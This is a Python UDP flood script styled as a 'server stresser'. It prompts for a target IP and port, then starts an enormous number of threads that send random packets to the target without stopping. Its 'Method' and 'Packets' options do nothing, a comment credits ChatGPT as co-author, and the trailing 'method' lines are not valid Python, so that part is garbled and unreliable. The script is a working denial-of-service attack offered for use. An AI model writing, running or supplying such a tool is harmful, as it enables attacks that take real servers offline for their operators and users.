import socket
import time
import os
import random
import threading

# Coding by: CHATGPT x EnderBob x ItzMuxGamer
# Sending To Attack Server
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
os.system("clear")
print("\033[31m")
print("            Server Stress")
print("|=====================================|")
print("|         MuxTeamH4CK Stress          |")
print("|=====================================|")
print("|Methods: UDP x UDPFLOOD x UDP-BYPASS |")
print("|=====================================|")
print(" ")
print("\033[31m")
ip = input("IP: ")
port = int(input("Port: "))
packets = input("Packets: ")
method = input("Method: ")
time.sleep(2)
print(" ")
os.system("clear")
print("\033[31m")
print("           ATTACK INFO")
print("=================================")
print(f"IP: {ip}")
print(f"Port: {port}")
print(f"Packets: {packets}")
print(f"Method: {method}")
print("Stopped Attack: CTRL + Z")
print("=================================")
print("Successfull Attack Sent To Server")
# Staring Stresser

for i in range(999999999999999999999999):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(1)

method: UDP
method: UDPFLOOD
method: UDP-BYPASS

#Methods X

udp.attack(nor)(ip)(port)
udpflood.attack(vpsattack.byflydoos)
udp-bypass.attack(Bypassed.ServerAccessingPanel)
